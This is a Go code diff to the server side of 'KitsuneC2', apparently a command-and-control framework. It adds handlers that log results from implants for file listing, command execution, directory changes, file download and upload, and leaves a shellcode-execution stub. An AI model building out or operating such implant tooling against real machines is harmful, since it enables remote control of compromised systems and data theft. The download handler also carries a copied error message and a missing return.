@@ -4,6 +4,7 @@ package handlers
 
 import (
 	"KitsuneC2/lib/communication"
+	"KitsuneC2/lib/utils"
 	"KitsuneC2/server/db"
 	"KitsuneC2/server/transport"
 	"encoding/json"
@@ -20,6 +21,12 @@ var messageTypeToFunc = map[int]func(*transport.Session, interface{}){
 	4: handleImplantErrorResp,
 	//reserved for implant functionality
 	12: handleFileInfoResp,
+	14: handleLsResp,
+	16: handleExecResp,
+	18: handleCdResp,
+	20: handleDownloadResp,
+	22: handleUploadResp,
+	24: handleShellcodeExecResp,
 }
 
 // This function can be passed to a listener to handle incoming connections. This function guarantees that the connection will be closed after it's
@@ -126,19 +133,126 @@ func handleImplantErrorResp(sess *transport.Session, data interface{}) {
 	}
 }
 
+//---------------Begin module handlers--------------------
+
 // Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
 func handleFileInfoResp(sess *transport.Session, data interface{}) {
 	fileInfoResp, ok := data.(*communication.FileInfoResp)
 	if !ok {
-		log.Printf("[ERROR] Received envelope with messageType=2 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
+		log.Printf("[ERROR] Received envelope with messageType=12 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
 		return
 	}
-	marshalledRes, err := json.Marshal(fileInfoResp)
+	marshalledResult, err := json.Marshal(fileInfoResp)
 	if err != nil {
 		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", fileInfoResp.TaskId, err.Error())
 	}
-	err = db.CompleteTask(fileInfoResp.TaskId, marshalledRes)
+	err = db.CompleteTask(fileInfoResp.TaskId, marshalledResult)
 	if err != nil {
 		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", fileInfoResp.TaskId, err.Error())
 	}
+}
+
+func handleLsResp(sess *transport.Session, data interface{}) {
+	lsResp, ok := data.(*communication.LsResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=14 (LsResp), but could not convert envelope data to LsResp datastructure")
+		return
+	}
+	marshalledResult, err := json.Marshal(lsResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", lsResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(lsResp.TaskId, marshalledResult)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", lsResp.TaskId, err.Error())
+	}
+}
+
+func handleExecResp(sess *transport.Session, data interface{}) {
+	execResp, ok := data.(*communication.ExecResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=16 (ExecResp), but could not convert envelope data to ExecResp datastructure")
+		return
+	}
+	marshalledResult, err := json.Marshal(execResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", execResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(execResp.TaskId, marshalledResult)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", execResp.TaskId, err.Error())
+	}
+}
+
+func handleCdResp(sess *transport.Session, data interface{}) {
+	cdResp, ok := data.(*communication.CdResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=18 (CdResp), but could not convert envelope data to CdResp datastructure")
+		return
+	}
+	marshalledResult, err := json.Marshal(cdResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", cdResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(cdResp.TaskId, marshalledResult)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", cdResp.TaskId, err.Error())
+	}
+}
+
+func handleDownloadResp(sess *transport.Session, data interface{}) {
+	downloadResp, ok := data.(*communication.DownloadResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=14 (LsResp), but could not convert envelope data to LsResp datastructure")
+		return
+	}
+	downloadReqEntry, err := db.GetTask(downloadResp.TaskId)
+	if err != nil {
+		log.Printf("[ERROR] While handling a download response, could not find original task that caused this response. Offending task ID: %s", downloadResp.TaskId)
+		dbEntry, _ := json.Marshal("Could not find original task corresponding to this result. Discarded result.")
+		db.CompleteTask(downloadResp.TaskId, dbEntry)
+		return
+	}
+	downloadReq := new(communication.DownloadReq)
+	err = json.Unmarshal(downloadReqEntry.Task_data, downloadReq)
+	if err != nil {
+		log.Printf("[ERROR] Could not unmarshal task with ID: %s back into its original structure while handling a download request.", downloadResp.TaskId)
+		dbEntry, _ := json.Marshal("Original task corresponding to this result was corrupted. Discarded result.")
+		db.CompleteTask(downloadReq.TaskId, dbEntry)
+		return
+	}
+
+	err = utils.WriteFile(downloadResp.Contents, downloadReq.Destination)
+	if err != nil {
+		log.Printf("[ERROR] Could not write downloaded file to destination: %s. Reason: %s", downloadReq.Destination, err.Error())
+		dbEntry, _ := json.Marshal("Could not write downloaded file to intended destination. Check logs for more info.")
+		db.CompleteTask(downloadReq.TaskId, dbEntry)
+	}
+
+	dbEntry, _ := json.Marshal("Wrote file to: " + downloadReq.Destination)
+	err = db.CompleteTask(downloadReq.TaskId, dbEntry)
+	if err != nil {
+		log.Printf("[Error] could not set task with ID: %s to complete status. Reason: %s", downloadReq.TaskId, err.Error())
+	}
+}
+
+func handleUploadResp(sess *transport.Session, data interface{}) {
+	uploadResp, ok := data.(*communication.UploadResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=22 (UploadResp), but could not convert envelope data to UploadResp datastructure")
+		return
+	}
+	marshalledResult, err := json.Marshal(uploadResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", uploadResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(uploadResp.TaskId, marshalledResult)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", uploadResp.TaskId, err.Error())
+	}
+}
+
+// TODO
+func handleShellcodeExecResp(sess *transport.Session, data interface{}) {
+
 }
